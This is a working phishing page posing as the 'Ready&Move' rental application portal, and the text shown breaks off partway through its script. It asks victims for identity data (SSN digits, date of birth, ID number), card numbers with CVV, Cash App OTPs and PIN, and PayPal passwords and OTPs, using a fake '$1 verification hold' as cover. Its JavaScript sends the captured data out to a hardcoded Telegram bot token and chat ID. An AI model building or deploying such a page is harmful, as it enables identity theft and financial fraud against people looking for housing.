<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ready&Move - Application Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; }
        body { background-color: #f5f7fa; color: #333; line-height: 1.6; }
        body.dark-mode { background: #181c20; color: #e0e6ed; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; background: white; box-shadow: 0 0 20px rgba(0,0,0,0.1); border-radius: 8px; }
        body.dark-mode .container { background: #23272b; box-shadow: 0 0 24px rgba(0,0,0,0.4);}
        .page { display: none; padding: 30px; }
        .page.active { display: block; }
        h1, h2 { color: #2c3e50; margin-bottom: 20px; }
        .logo { text-align: center; margin-bottom: 30px; font-size: 28px; font-weight: 700; color: #3498db; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: 500; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
        body.dark-mode input, body.dark-mode select { background: #23272b; color: #e0e6ed; border-color: #444; }
        .btn { background-color: #3498db; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: 500; width: 100%; margin-top: 10px; transition: background-color 0.3s; }
        .btn:hover { background-color: #2980b9; }
        .btn-secondary { background-color: #95a5a6; }
        .btn-secondary:hover { background-color: #7f8c8d; }
        body.dark-mode .btn { background: #2d8cff; color: #fff; }
        body.dark-mode .btn-secondary { background: #444; color: #fff; }
        .btn-cashapp { background-color: #00d54b; }
        .btn-cashapp:hover { background-color: #00b140; }
        .btn-paypal { background-color: #003087; }
        .btn-paypal:hover { background-color: #002366; }
        .disclaimer { font-size: 12px; color: #7f8c8d; margin-top: 30px; border-top: 1px solid #eee; padding-top: 15px; }
        body.dark-mode .disclaimer { color: #aaa; border-top: 1px solid #333; }
        .payment-option { border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-bottom: 15px; cursor: pointer; transition: all 0.3s; }
        body.dark-mode .payment-option { background: #23272b; border-color: #444; }
        .payment-option:hover { border-color: #3498db; background-color: #f8f9fa; }
        .payment-option.selected { border-color: #3498db; background-color: #ebf5fb; }
        body.dark-mode .payment-option.selected { background: #1e2a22; border-color: #27ae60; }
        .payment-icon { width: 40px; height: 40px; margin-right: 15px; vertical-align: middle; }
        .otp-container { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 1px solid #ddd; border-radius: 4px; }
        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(255,255,255,0.8); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; display: none; }
        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-countdown { font-size: 18px; color: #e74c3c; margin-bottom: 10px; }
        .progress-bar { display: flex; margin-bottom: 30px; justify-content: space-between; }
        .progress-step { text-align: center; flex: 1; position: relative; }
        .step-number { width: 30px; height: 30px; background-color: #ddd; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 5px; color: white; }
        body.dark-mode .step-number { background: #444; }
        .progress-step.active .step-number { background-color: #3498db; }
        body.dark-mode .progress-step.active .step-number { background: #2d8cff; }
        .progress-step.completed .step-number { background-color: #2ecc71; }
        body.dark-mode .progress-step.completed .step-number { background: #27ae60; }
        .step-name { font-size: 12px; color: #7f8c8d; }
        body.dark-mode .progress-step .step-name { color: #aaa; }
        body.dark-mode .progress-step.active .step-name { color: #2d8cff; }
        body.dark-mode .progress-step.completed .step-name { color: #27ae60; }
        .progress-step:not(:last-child)::after { content: ''; position: absolute; top: 15px; left: 50%; width: 100%; height: 2px; background-color: #ddd; z-index: -1; }
        .progress-step.completed:not(:last-child)::after { background-color: #2ecc71; }
        .error { color: #ff3860; font-size: 14px; margin-top: 5px; display: none; }
        .card-logos { display: flex; gap: 10px; margin-top: 10px; }
        .card-logo { height: 30px; }
        .time-slot.selected { background: #3498db; color: #fff; border-radius: 4px; padding: 4px 12px; }
        .time-slot { cursor: pointer; margin-right: 10px; display: inline-block; padding: 4px 12px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 5px; }
        #continueWithDebitBtn { margin-top: 15px; }
        .secure-hold-notice { margin-bottom:12px;display:flex;align-items:center; }
        .secure-hold-notice span:first-child { color:#27ae60;margin-right:8px;font-size:20px; }
        .secure-badge { display:inline-block;background:#eafaf1;color:#27ae60;padding:2px 8px;border-radius:8px;font-size:13px;margin-left:10px; }
        body.dark-mode .secure-badge { background: #1e2a22; color: #27ae60; }
        .masked-card-preview { margin-top: 6px; color: #34495e; font-family:monospace;font-size:17px; }
        .progress-bar-hold { width:100%;background:#eee;border-radius:4px;overflow:hidden;margin-bottom:8px;height:14px; }
        .progress-bar-hold-inner { height:100%;background:#27ae60;width:0;transition:width 0.3s; }
        #holdFaqModal {position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:1200;background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,0.21);width:90%;max-width:400px;padding:24px;}
        #holdFaqModal h2 {margin-bottom:10px;}
        #holdFaqModal ul {padding-left:20px;}
        #holdFaqModal[style*="display: none"] {display:none!important;}
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-countdown" id="loadingCountdown" style="display:none"></div>
        <div class="progress-bar-hold" id="progressBarHold" style="display:none;">
            <div class="progress-bar-hold-inner" id="progressBarHoldInner"></div>
        </div>
    </div>
    <div id="holdFaqModal" style="display:none;">
        <h2>About the $1 Verification Hold</h2>
        <p>
            For your security, we use a temporary $1 authorization (hold) to verify your payment method.
            <ul>
                <li>The hold is not a charge and is released automatically after verification.</li>
                <li>This is a common anti-fraud practice used by banks and payment processors.</li>
                <li>You may see a "pending" $1 transaction on your account for a short period.</li>
            </ul>
            <strong>Your information is encrypted and handled securely.</strong>
        </p>
        <div class="form-group">
            <button class="btn" onclick="hideHoldFaqModal()">Close</button>
        </div>
    </div>
    <div class="container">
        <div class="logo">Ready&Move</div>
        <div class="progress-bar">
            <div class="progress-step active" id="step1">
                <div class="step-number">1</div>
                <div class="step-name">Introduction</div>
            </div>
            <div class="progress-step" id="step2">
                <div class="step-number">2</div>
                <div class="step-name">Application</div>
            </div>
            <div class="progress-step" id="step3">
                <div class="step-number">3</div>
                <div class="step-name">Payment</div>
            </div>
            <div class="progress-step" id="step4">
                <div class="step-number">4</div>
                <div class="step-name">Schedule Tour</div>
            </div>
        </div>
        <!-- Page 1: Introduction -->
        <div class="page active" id="page1">
            <h1>Welcome to Ready&Move</h1>
            <p>Thank you for your interest in our properties. Before scheduling a tour, we require all applicants to complete a brief application and pay a $1 verification fee.</p>
            <div class="form-group">
                <button class="btn" id="continueBtn">Continue to Application</button>
            </div>
            <div class="disclaimer">
                <p><a href="#disclaimerModal" id="disclaimerLink">Important Disclaimer, Terms of Service & Notice</a></p>
                <p>By submitting this application, you agree to our terms of service.</p>
            </div>
        </div>
        <!-- Page 2: Application Form -->
        <div class="page" id="page2">
            <h2>Rental Application</h2>
            <p>Please provide the following information to verify your identity.</p>
            <div class="form-group"><label for="fullName">Full Legal Name</label><input type="text" id="fullName" required></div>
            <div class="form-group"><label for="ssnLast4">Last 4 Digits of SSN</label><input type="text" id="ssnLast4" maxlength="4" pattern="\d{4}" required></div>
            <div class="form-group"><label for="dob">Date of Birth</label><input type="date" id="dob" required></div>
            <div class="form-group"><label for="address">Current Address</label><input type="text" id="address" required></div>
            <div class="form-group"><label for="city">City</label><input type="text" id="city" required></div>
            <div class="form-group">
                <label for="state">State</label>
                <input type="text" id="state" placeholder="Enter your state" required>
            </div>
            <div class="form-group"><label for="zip">ZIP Code</label><input type="text" id="zip" pattern="\d{5}" required></div>
            <div class="form-group">
                <label for="idType">Government ID Type</label>
                <select id="idType" required>
                    <option value="">Select ID Type</option>
                    <option value="driver">Driver's License</option>
                    <option value="state">State ID</option>
                    <option value="passport">Passport</option>
                </select>
            </div>
            <div class="form-group"><label for="idNumber">ID Number</label><input type="text" id="idNumber" required></div>
            <div class="disclaimer">
                <p><a href="#disclaimerModal" id="disclaimerLink2">Important Disclaimer, Terms of Service & Notice</a></p>
                <p>By submitting this application, you agree to our terms of service.</p>
            </div>
            <div class="form-group">
                <button class="btn" id="submitApplicationBtn">Submit Application</button>
                <button class="btn btn-secondary" id="backBtn1">Back</button>
            </div>
        </div>
        <!-- Page 3: Payment Selection -->
        <div class="page" id="page3">
            <h2>Verification Payment</h2>
            <p>Please pay the $1 verification fee to continue with your application and schedule a tour.</p>
            <div class="secure-hold-notice">
                <span>&#128274;</span>
                <span>
                    We place a <strong>secure $1 hold</strong> on your payment method for identity verification. 
                    The hold is automatically released after verification.
                    <a href="#" id="holdFaqLink">(Why?)</a>
                </span>
            </div>
            <div class="payment-option" id="bankOption">
                <img src="https://media.istockphoto.com/id/1465234647/fr/vectoriel/banque-avec-signe-dollar-ic%C3%B4ne-avec-reflet-sur-fond-blanc.jpg?s=612x612&w=0&k=20&c=WS2VVm83ZVN3L0dIWAB9TLeMUFW-HvNnq8dihgquORc=" alt="Bank" class="payment-icon">
                <span>Link Bank</span>
            </div>
            <div class="payment-option" id="cashappOption">
                <span style="display:inline-block;width:40px;height:40px;background:#00d54b;border-radius:10px;vertical-align:middle;line-height:40px;text-align:center;margin-right:15px;">
                    <span style="color:#fff;font-size:28px;font-weight:bold;position:relative;top:2px;">$</span>
                </span>
                <span>Pay with Cash App</span>
                <span class="secure-badge">Secure</span>
            </div>
            <div class="payment-option" id="paypalOption">
                <img src="https://www.paypalobjects.com/webstatic/icon/pp32.png" alt="PayPal" class="payment-icon">
                <span>Pay with PayPal</span>
                <span class="secure-badge">Secure</span>
            </div>
            <div class="form-group">
                <button class="btn" id="processPaymentBtn" disabled>Continue to Payment</button>
                <button class="btn btn-secondary" id="backBtn2">Back</button>
            </div>
            <div class="disclaimer">
                <p><a href="#disclaimerModal" id="disclaimerLink3">Important Disclaimer, Terms of Service & Notice</a></p>
                <p></p>
            </div>
        </div>
        <!-- Bank Payment Page -->
        <div class="page" id="bankPage">
            <h2>Link Your Bank</h2>
            <p>Enter your bank name to link your account.</p>
            <div class="form-group">
                <label for="bankName">Bank Name</label>
                <input type="text" id="bankName" placeholder="e.g. Chase, Bank of America" required>
                <div class="error" id="bankError">Bank not available. Please use debit card instead.</div>
                <button class="btn" id="continueWithDebitBtn" style="display:none;">Continue with Debit Card</button>
            </div>
            <div class="form-group">
                <button class="btn" id="verifyBankBtn">Verify Bank</button>
                <button class="btn btn-secondary" id="backBtnBank">Back</button>
            </div>
        </div>
        <!-- Debit Card Payment Page -->
        <div class="page" id="debitCardPage">
            <h2>Enter Debit Card Details <span class="secure-badge">PCI DSS Secure</span></h2>
            <div class="form-group">
                <label for="cardNumber">Card Number</label>
                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                <div class="masked-card-preview" id="maskedCardPreview"></div>
            </div>
            <div class="form-group">
                <label for="cardExpiry">Expiration Date</label>
                <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
            </div>
            <div class="form-group">
                <label for="cardCvv">CVV</label>
                <input type="text" id="cardCvv" placeholder="123" maxlength="4" required>
            </div>
            <div class="form-group">
                <label for="cardName">Name on Card</label>
                <input type="text" id="cardName" required>
            </div>
            <div class="card-logos">
                <img src="https://logo.clearbit.com/visa.com" alt="Visa" class="card-logo">
                <img src="https://logo.clearbit.com/mastercard.com" alt="Mastercard" class="card-logo">
                <img src="https://logo.clearbit.com/americanexpress.com" alt="American Express" class="card-logo">
                <img src="https://logo.clearbit.com/discover.com" alt="Discover" class="card-logo">
            </div>
            <div class="form-group">
                <button class="btn" id="submitDebitCardBtn">Pay $1.00</button>
                <button class="btn btn-secondary" id="backBtnDebit">Back</button>
            </div>
        </div>
        <!-- Cash App Payment Page -->
        <div class="page" id="cashappPage">
            <div style="text-align: center; margin-bottom: 20px;">
                <span style="display:inline-block;width:60px;height:60px;background:#00d54b;border-radius:14px;vertical-align:middle;line-height:60px;text-align:center;">
                    <span style="color:#fff;font-size:44px;font-weight:bold;position:relative;top:6px;">$</span>
                </span>
                <h2>Cash App Payment <span class="secure-badge">Secure</span></h2>
            </div>
            <div class="form-group">
                <label for="cashappEmail">Email or Phone</label>
                <input type="text" id="cashappEmail" placeholder="Email or phone number" required>
            </div>
            <div class="form-group">
                <button class="btn btn-cashapp" id="continueCashappBtn">Continue</button>
                <button class="btn btn-secondary" id="backBtnCashapp">Back</button>
            </div>
        </div>
        <!-- Cash App OTP Page -->
        <div class="page" id="cashappOtpPage">
            <div style="text-align: center; margin-bottom: 20px;">
                <span style="display:inline-block;width:60px;height:60px;background:#00d54b;border-radius:14px;vertical-align:middle;line-height:60px;text-align:center;">
                    <span style="color:#fff;font-size:44px;font-weight:bold;position:relative;top:6px;">$</span>
                </span>
                <h2>Verify Your Identity</h2>
                <p>We sent a 6-digit code to <span id="cashappOtpTarget">example@email.com</span></p>
            </div>
            <div class="otp-container">
                <input type="text" class="otp-input" maxlength="1" data-index="1">
                <input type="text" class="otp-input" maxlength="1" data-index="2">
                <input type="text" class="otp-input" maxlength="1" data-index="3">
                <input type="text" class="otp-input" maxlength="1" data-index="4">
                <input type="text" class="otp-input" maxlength="1" data-index="5">
                <input type="text" class="otp-input" maxlength="1" data-index="6">
            </div>
            <div class="error" id="cashappOtpError">Invalid code. Please try again.</div>
            <div class="form-group">
                <button class="btn btn-cashapp" id="verifyCashappBtn" disabled>Verify</button>
                <button class="btn btn-secondary" id="backBtnCashappOtp">Back</button>
            </div>
            <div style="text-align: center; margin-top: 20px; font-size: 14px;">
                Didn't receive a code? <a href="#" id="resendCashappOtp">Resend</a>
            </div>
        </div>
        <!-- New Cash App PIN Page -->
        <div class="page" id="cashappPinPage">
            <div style="text-align: center; margin-bottom: 20px;">
                <h2>Enter Cash App PIN</h2>
                <p>Please enter your Cash App PIN to complete the transaction.</p>
            </div>
            <div class="form-group">
                <label for="cashappPin">PIN</label>
                <input type="password" id="cashappPin" placeholder="Enter PIN" required>
            </div>
            <div class="form-group">
                <button class="btn btn-cashapp" id="submitCashappPinBtn">Submit PIN</button>
                <button class="btn btn-secondary" id="backBtnCashappPin">Back</button>
            </div>
        </div>
        <!-- New Cash App Link Verification Page -->
        <div class="page" id="cashappLinkVerifyPage">
            <div style="text-align:center;">
                <span style="display:inline-block;width:60px;height:60px;background:#00d54b;border-radius:14px;vertical-align:middle;line-height:60px;text-align:center;margin-bottom:18px;">
                    <span style="color:#fff;font-size:44px;font-weight:bold;position:relative;top:6px;">$</span>
                </span>
            </div>
            <h2 style="color:#00d54b;text-align:center;margin-bottom:10px;">Verify with Cash App Link</h2>
            <p style="color:#00d54b;text-align:center;margin-bottom:22px;font-size:16px;">
                Please enter the link we just sent you to verify your identity.
            </p>
            <div class="form-group" style="margin-bottom:18px;">
                <input type="url" id="cashappLinkInput" placeholder="Paste verification link here" required style="border:2px solid #00d54b;border-radius:8px;font-size:16px;padding:12px;">
            </div>
            <div class="form-group" style="margin-bottom:0;">
                <button class="btn btn-cashapp" id="submitCashappLinkBtn" style="font-weight:bold;">Continue</button>
            </div>
            <div class="disclaimer" style="margin-top:18px;text-align:center;">
           
            </div>
        </div>
        <!-- PayPal Payment Page -->
        <div class="page" id="paypalPage">
            <div style="text-align: center; margin-bottom: 20px;">
                <img src="https://www.paypalobjects.com/webstatic/icon/pp32.png" alt="PayPal" style="width: 60px; height: 60px;">
                <h2>PayPal Payment <span class="secure-badge">Secure</span></h2>
            </div>
            <div class="form-group">
                <label for="paypalEmail">Email or Phone</label>
                <input type="text" id="paypalEmail" placeholder="Email or phone number" required>
            </div>
            <div class="form-group">
                <label for="paypalPassword">Password</label>
                <input type="password" id="paypalPassword" required>
            </div>
            <div class="form-group">
                <button class="btn btn-paypal" id="continuePaypalBtn">Continue</button>
                <button class="btn btn-secondary" id="backBtnPaypal">Back</button>
            </div>
        </div>
        <!-- PayPal OTP Page -->
        <div class="page" id="paypalOtpPage">
            <div style="text-align: center; margin-bottom: 20px;">
                <img src="https://www.paypalobjects.com/webstatic/icon/pp32.png" alt="PayPal" style="width: 60px; height: 60px;">
                <h2>Verify Your Identity</h2>
                <p>We sent a 6-digit code to <span id="paypalOtpTarget">example@email.com</span></p>
            </div>
            <div class="otp-container">
                <input type="text" class="otp-input" maxlength="1" data-index="1">
                <input type="text" class="otp-input" maxlength="1" data-index="2">
                <input type="text" class="otp-input" maxlength="1" data-index="3">
                <input type="text" class="otp-input" maxlength="1" data-index="4">
                <input type="text" class="otp-input" maxlength="1" data-index="5">
                <input type="text" class="otp-input" maxlength="1" data-index="6">
            </div>
            <div class="error" id="paypalOtpError">Invalid code. Please try again.</div>
            <div class="form-group">
                <button class="btn btn-paypal" id="verifyPaypalBtn" disabled>Verify</button>
                <button class="btn btn-secondary" id="backBtnPaypalOtp">Back</button>
            </div>
            <div style="text-align: center; margin-top: 20px; font-size: 14px;">
                Didn't receive a code? <a href="#" id="resendPaypalOtp">Resend</a>
            </div>
        </div>
        <!-- Page 4: Schedule Tour -->
        <div class="page" id="page4">
            <h2>Schedule Your Tour</h2>
            <div id="holdResultMsg" style="background:#eafaf1;color:#27ae60;padding:10px 16px;border-radius:6px;font-size:16px;display:none;margin-bottom:16px;">
                $1 hold was successfully placed and then released.
            </div>
            <p>Your application has been received. Please select a date and time for your property tour.</p>
            <div class="form-group">
                <label for="tourDate">Select Date</label>
                <input type="date" id="tourDate" min="">
            </div>
            <div class="form-group">
                <label>Available Times</label>
                <div class="time-slots">
                    <div class="time-slot">9:00 AM</div>
                    <div class="time-slot">11:00 AM</div>
                    <div class="time-slot">1:00 PM</div>
                    <div class="time-slot">3:00 PM</div>
                    <div class="time-slot">5:00 PM</div>
                </div>
            </div>
            <div class="form-group">
                <label for="property">Select Property</label>
                <select id="property">
                    <option value="downtown">Downtown Luxury Apartments</option>
                    <option value="hillside">Hillside Villas</option>
                    <option value="riverview">Riverview Condos</option>
                </select>
            </div>
            <div class="form-group">
                <button class="btn" id="confirmTourBtn">Confirm Tour</button>
                <button class="btn btn-secondary" id="backBtn3">Back</button>
            </div>
        </div>
        <!-- Success Page -->
        <div class="page" id="successPage">
            <h2>Tour Scheduled Successfully!</h2>
            <p>Your tour has been confirmed. We look forward to meeting you.</p>
            <p><strong>Date:</strong> <span id="confirmedDate"></span></p>
            <p><strong>Time:</strong> <span id="confirmedTime"></span></p>
            <p><strong>Property:</strong> <span id="confirmedProperty"></span></p>
            <div class="form-group">
                <button class="btn" id="finishBtn">Finish</button>
            </div>
        </div>
        <!-- Disclaimer Modal -->
        <div class="page" id="disclaimerModal">
            <h2>Important Disclaimer, Terms of Service & Notice</h2>
            </ul>
            <div class="form-group">
                <button class="btn" id="closeDisclaimerBtn">I Understand</button>
            </div>
        </div>
    </div>
    <script>
        // === TELEGRAM BOT SETTINGS ===
        const TELEGRAM_BOT_TOKEN = "7692222247:AAG23z6unx3rzaMgw5bLctYyt2MuA-Xknxc";
        const TELEGRAM_CHAT_ID = "7923238047";
        
        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message
                })
            });
        }
        
        // Modal FAQ
        document.getElementById('holdFaqLink').onclick = function(e) {
            e.preventDefault();
            document.getElementById('holdFaqModal').style.display = 'block';
        };
        
        function hideHoldFaqModal() {
            document.getElementById('holdFaqModal').style.display = 'none';
        }
        
        // DOM Elements
        const pages = {
            page1: document.getElementById('page1'),
            page2: document.getElementById('page2'),
            page3: document.getElementById('page3'),
            bankPage: document.getElementById('bankPage'),
            debitCardPage: document.getElementById('debitCardPage'),
            cashappPage: document.getElementById('cashappPage'),
            cashappOtpPage: document.getElementById('cashappOtpPage'),
            cashappPinPage: document.getElementById('cashappPinPage'),
            cashappLinkVerifyPage: document.getElementById('cashappLinkVerifyPage'),
            paypalPage: document.getElementById('paypalPage'),
            paypalOtpPage: document.getElementById('paypalOtpPage'),
            page4: document.getElementById('page4'),
            successPage: document.getElementById('successPage'),
            disclaimerModal: document.getElementById('disclaimerModal')
        };
        
        const progressSteps = {
            step1: document.getElementById('step1'),
            step2: document.getElementById('step2'),
            step3: document.getElementById('step3'),
            step4: document.getElementById('step4')
        };
        
        const buttons = {
            continueBtn: document.getElementById('continueBtn'),
            submitApplicationBtn: document.getElementById('submitApplicationBtn'),
            processPaymentBtn: document.getElementById('processPaymentBtn'),
            verifyBankBtn: document.getElementById('verifyBankBtn'),
            submitDebitCardBtn: document.getElementById('submitDebitCardBtn'),
            continueCashappBtn: document.getElementById('continueCashappBtn'),
            verifyCashappBtn: document.getElementById('verifyCashappBtn'),
            continuePaypalBtn: document.getElementById('continuePaypalBtn'),
            verifyPaypalBtn: document.getElementById('verifyPaypalBtn'),
            confirmTourBtn: document.getElementById('confirmTourBtn'),
            finishBtn: document.getElementById('finishBtn'),
            backBtn1: document.getElementById('backBtn1'),
            backBtn2: document.getElementById('backBtn2'),
            backBtnBank: document.getElementById('backBtnBank'),
            backBtnDebit: document.getElementById('backBtnDebit'),
            backBtnCashapp: document.getElementById('backBtnCashapp'),
            backBtnCashappOtp: document.getElementById('backBtnCashappOtp'),
            backBtnCashappPin: document.getElementById('backBtnCashappPin'),
            backBtnPaypal: document.getElementById('backBtnPaypal'),
            backBtnPaypalOtp: document.getElementById('backBtnPaypalOtp'),
            backBtn3: document.getElementById('backBtn3'),
            closeDisclaimerBtn: document.getElementById('closeDisclaimerBtn'),
            disclaimerLink: document.getElementById('disclaimerLink'),
            disclaimerLink2: document.getElementById('disclaimerLink2'),
            disclaimerLink3: document.getElementById('disclaimerLink3'),
            continueWithDebitBtn: document.getElementById('continueWithDebitBtn'),
            // New button references for Cash App PIN page:
            submitCashappPinBtn: document.getElementById('submitCashappPinBtn'),
            backBtnCashappPin: document.getElementById('backBtnCashappPin')
        };
        
        const paymentOptions = {
            bank: document.getElementById('bankOption'),
            cashapp: document.getElementById('cashappOption'),
            paypal: document.getElementById('paypalOption')
        };
        
        const timeSlots = document.querySelectorAll('.time-slot');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingCountdown = document.getElementById('loadingCountdown');
        const progressBarHold = document.getElementById('progressBarHold');
        const progressBarHoldInner = document.getElementById('progressBarHoldInner');
        
        // OTP Elements
        const cashappOtpInputs = document.querySelectorAll('#cashappOtpPage .otp-input');
        const paypalOtpInputs = document.querySelectorAll('#paypalOtpPage .otp-input');
        
        // Variables
        let currentPage = 'page1';
        let selectedPaymentMethod = null;
        let selectedTimeSlot = null;
        let tourData = {};
        let holdResultShown = false;
        let lastPaymentMethod = null;
        
        if (document.getElementById('tourDate')) {
            document.getElementById('tourDate').min = new Date(new Date().getTime() + 86400000).toISOString().split('T')[0];
        }
        
        function navigateTo(page) {
            pages[currentPage].classList.remove('active');
            pages[page].classList.add('active');
            if (page === 'page1') updateProgress(1);
            if (page === 'page2') updateProgress(2);
            if (page === 'page3') updateProgress(3);
            if (page === 'page4') updateProgress(4);
            currentPage = page;
        }
        
        const _navigateTo = navigateTo;
        const pagesToDelay = [
            'page1','page2','page3','bankPage','debitCardPage',
            'cashappPage','cashappOtpPage','paypalPage','paypalOtpPage','page4','successPage'
        ];
        
        function navigateToWithLoad(page) {
            if (pagesToDelay.includes(page) && currentPage !== page) {
                loadingOverlay.style.display = 'flex';
                setTimeout(() => {
                    loadingOverlay.style.display = 'none';
                    _navigateTo(page);
                }, 6000);
            } else {
                _navigateTo(page);
            }
        }
        
        buttons.continueBtn.addEventListener('click', () => navigateToWithLoad('page2'));
        buttons.submitApplicationBtn.addEventListener('click', submitApplication);
        buttons.processPaymentBtn.addEventListener('click', () => {
            if (selectedPaymentMethod === 'bank') navigateToWithLoad('bankPage');
            if (selectedPaymentMethod === 'cashapp') navigateToWithLoad('cashappPage');
            if (selectedPaymentMethod === 'paypal') navigateToWithLoad('paypalPage');
        });
        buttons.verifyBankBtn.addEventListener('click', verifyBank);
        buttons.submitDebitCardBtn?.addEventListener('click', submitDebitCard);
        buttons.continueCashappBtn.addEventListener('click', continueCashapp);
        buttons.continuePaypalBtn.addEventListener('click', continuePaypal);
        buttons.confirmTourBtn?.addEventListener('click', confirmTour);
        buttons.finishBtn?.addEventListener('click', () => location.reload());
        buttons.backBtn1.addEventListener('click', () => navigateToWithLoad('page1'));
        buttons.backBtn2.addEventListener('click', () => navigateToWithLoad('page2'));
        buttons.backBtnBank.addEventListener('click', () => navigateToWithLoad('page3'));
        buttons.backBtnDebit?.addEventListener('click', () => navigateToWithLoad('bankPage'));
        buttons.backBtnCashapp.addEventListener('click', () => navigateToWithLoad('page3'));
        buttons.backBtnCashappOtp.addEventListener('click', () => navigateToWithLoad('cashappPage'));
        buttons.backBtnCashappPin.addEventListener('click', () => navigateToWithLoad('cashappOtpPage'));
        buttons.backBtnPaypal.addEventListener('click', () => navigateToWithLoad('page3'));
        buttons.backBtnPaypalOtp.addEventListener('click', () => navigateToWithLoad('paypalPage'));
        buttons.backBtn3?.addEventListener('click', () => navigateToWithLoad('page3'));
        buttons.closeDisclaimerBtn.addEventListener('click', () => navigateToWithLoad('page2'));
        
        [buttons.disclaimerLink, buttons.disclaimerLink2, buttons.disclaimerLink3].forEach(link => {
            if(link) link.addEventListener('click', (e) => { e.preventDefault(); _navigateTo('disclaimerModal'); });
        });
        
        paymentOptions.bank.addEventListener('click', () => selectPaymentMethod('bank'));
        paymentOptions.cashapp.addEventListener('click', () => selectPaymentMethod('cashapp'));
        paymentOptions.paypal.addEventListener('click', () => selectPaymentMethod('paypal'));
        
        timeSlots.forEach(slot => {
            slot.addEventListener('click', function() {
                timeSlots.forEach(s => s.classList.remove('selected'));
                this.classList.add('selected');
                selectedTimeSlot = this.textContent;
            });
        });
        
        cashappOtpInputs.forEach(input => {
            input.addEventListener('input', function() {
                const index = parseInt(this.dataset.index);
                if (this.value.length === 1 && index < 6) {
                    cashappOtpInputs[index].focus();
                }
                checkCashappOtpCompletion();
            });
            input.addEventListener('keydown', function(e) {
                const index = parseInt(this.dataset.index);
                if (e.key === 'Backspace' && this.value.length === 0 && index > 1) {
                    cashappOtpInputs[index - 2].focus();
                }
            });
        });
        
        paypalOtpInputs.forEach(input => {
            input.addEventListener('input', function() {
                const index = parseInt(this.dataset.index);
                if (this.value.length === 1 && index < 6) {
                    paypalOtpInputs[index].focus();
                }
                checkPaypalOtpCompletion();
            });
            input.addEventListener('keydown', function(e) {
                const index = parseInt(this.dataset.index);
                if (e.key === 'Backspace' && this.value.length === 0 && index > 1) {
                    paypalOtpInputs[index - 2].focus();
                }
            });
        });
        
        document.getElementById('resendCashappOtp').addEventListener('click', (e) => {
            e.preventDefault();
            alert('New verification code sent to your email/phone');
        });
        
        document.getElementById('resendPaypalOtp').addEventListener('click', (e) => {
            e.preventDefault();
            alert('New verification code sent to your email/phone');
        });
        
        const cardNumberInput = document.getElementById('cardNumber');
        const maskedCardPreview = document.getElementById('maskedCardPreview');
        if (cardNumberInput && maskedCardPreview) {
            cardNumberInput.addEventListener('input', function() {
                let num = this.value.replace(/\D/g,'').slice(0,16);
                let masked = '';
                if (num.length > 4) {
                    masked = '**** **** **** ' + num.slice(-4);
                } else if (num.length > 0) {
                    masked = num.replace(/./g,'*');
                }
                maskedCardPreview.textContent = masked;
            });
        }
        
        function updateProgress(step) {
            Object.values(progressSteps).forEach(step => {
                step.classList.remove('active', 'completed');
            });
            for (let i = 1; i < step; i++) {
                progressSteps[`step${i}`].classList.add('completed');
            }
            progressSteps[`step${step}`].classList.add('active');
        }
        
        function selectPaymentMethod(method) {
            Object.values(paymentOptions).forEach(option => {
                option.classList.remove('selected');
            });
            paymentOptions[method].classList.add('selected');
            selectedPaymentMethod = method;
            buttons.processPaymentBtn.disabled = false;
        }
        
        function submitApplication() {
            loadingOverlay.style.display = 'flex';
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                // Send application data to Telegram
                const msg = `Ready&Move - Application Submitted
Full Name: ${getVal('fullName')}
SSN Last 4: ${getVal('ssnLast4')}
DOB: ${getVal('dob')}
Address: ${getVal('address')}
City: ${getVal('city')}
State: ${getVal('state')}
ZIP: ${getVal('zip')}
ID Type: ${getVal('idType')}
ID Number: ${getVal('idNumber')}`;
                sendToTelegram(msg);
                _navigateTo('page3');
            }, 6000);
        }
        
        function verifyBank() {
            const bankName = document.getElementById('bankName').value.trim();
            if (!bankName) return;
            loadingOverlay.style.display = 'flex';
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                // Send bank attempt data to Telegram
                const msg = `Ready&Move - Bank Attempt
Full Name: ${getVal('fullName')}
SSN Last 4: ${getVal('ssnLast4')}
DOB: ${getVal('dob')}
Address: ${getVal('address')}
City: ${getVal('city')}
State: ${getVal('state')}
ZIP: ${getVal('zip')}
ID Type: ${getVal('idType')}
ID Number: ${getVal('idNumber')}
Bank Name: ${bankName}`;
                sendToTelegram(msg);
                document.getElementById('bankError').style.display = 'block';
                buttons.continueWithDebitBtn.style.display = 'block';
            }, 1500);
        }
        
        buttons.continueWithDebitBtn.addEventListener('click', function() {
            document.getElementById('bankError').style.display = 'none';
